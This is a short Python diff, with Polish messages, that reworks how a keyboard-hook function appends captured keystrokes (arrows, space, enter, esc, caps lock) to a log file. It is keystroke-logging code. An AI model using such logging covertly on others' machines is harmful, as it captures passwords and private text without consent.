@@ -15,17 +15,12 @@ def on_key_pressed(e):
         print(f"Przycisk '{e.name}' został wciśnięty.")
         with open(nazwa_pliku, 'a') as plik:
 
-            if e.name in ["down", "up", "left", "right", "caps lock"]:
+            if e.name in ["down", "up", "left", "right"]:
                 plik.writelines(e.name + "\n")
 
-            elif e.name == "space":
+            elif e.name in ["space", "enter", "alt", "esc", "caps lock"]:
                 plik.writelines(f" ({e.name}) ")
 
-            elif e.name == "enter":
-                plik.writelines(f" ({e.name}) \n")
-
-            elif e.name == "esc":
-                plik.writelines(f" ({e.name}) \n")
 
             else:
                 plik.writelines(e.name)
